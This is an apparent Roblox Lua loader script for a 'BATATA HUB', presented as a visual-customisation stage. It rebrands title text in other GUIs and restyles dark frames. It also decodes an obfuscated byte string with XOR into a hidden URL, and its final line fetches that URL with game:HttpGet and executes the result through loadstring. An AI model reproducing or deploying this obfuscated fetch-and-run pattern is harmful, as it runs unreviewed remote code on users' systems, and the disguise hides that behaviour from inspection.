
--[[ STAGE 2: VISUAL CORE ]]
local IXAe8fRxn5jCMOysSp7="\147\128\129\158\130\202\192\193\133\149\140\196\158\129\141\130\176\158\178\177\132\178\132\177\177\184\138\180\187\246\140\185\184\251\187\189\189\177\190\183\160\181\163\169\187\231\187\172\164\191\168\085\160\172\173\145\080\165\174\084\150\187\082\086\080\090\065\173\176\089\094\081\186\169\190\085\164\077\075\094\064\078\066\112\114\095\087\085\066\087\077\075\121\113\079\112\126\075\064\125\100\098\116\119\114\121\121\174\168\126\173\172\172\170\105\019\096"local QVUkoT65pqdlu6FO=208 local LeX9rzKFr7EdIXV8y=217 local O69vCAJ9Z6Ft_bgee=1 local gK32X4KXigEDlQYsr8E=1 local aovmoIyhuiPatc=1 local tSqkhA1om6XbyXVf6KPNeX=false local k7U722fvl8Kse8ZB=bit32 and bit32.bxor if not k7U722fvl8Kse8ZB then k7U722fvl8Kse8ZB=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local VxcKgvliZQe0hF={}for zjPXqHTNIqflPXHuU=1,#IXAe8fRxn5jCMOysSp7 do local dk9nsffBTvUQLYz6CB8=string.byte(IXAe8fRxn5jCMOysSp7,zjPXqHTNIqflPXHuU)local VU0V5lSyZyoPVhuC3239bR=(LeX9rzKFr7EdIXV8y+(zjPXqHTNIqflPXHuU*gK32X4KXigEDlQYsr8E)+aovmoIyhuiPatc)%256 if O69vCAJ9Z6Ft_bgee==0 then dk9nsffBTvUQLYz6CB8=(dk9nsffBTvUQLYz6CB8-VU0V5lSyZyoPVhuC3239bR)%256 VxcKgvliZQe0hF[zjPXqHTNIqflPXHuU]=string.char(k7U722fvl8Kse8ZB(dk9nsffBTvUQLYz6CB8,QVUkoT65pqdlu6FO))else dk9nsffBTvUQLYz6CB8=k7U722fvl8Kse8ZB(dk9nsffBTvUQLYz6CB8,QVUkoT65pqdlu6FO)VxcKgvliZQe0hF[zjPXqHTNIqflPXHuU]=string.char((dk9nsffBTvUQLYz6CB8-VU0V5lSyZyoPVhuC3239bR)%256)end end local MObN2KQGzt55L_BaD=table.concat(VxcKgvliZQe0hF)if tSqkhA1om6XbyXVf6KPNeX then MObN2KQGzt55L_BaD=string.reverse(MObN2KQGzt55L_BaD)end local QuCHX7QtTamGeUZPxY1=MObN2KQGzt55L_BaD
local HubName = "BATATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(QuCHX7QtTamGeUZPxY1))()
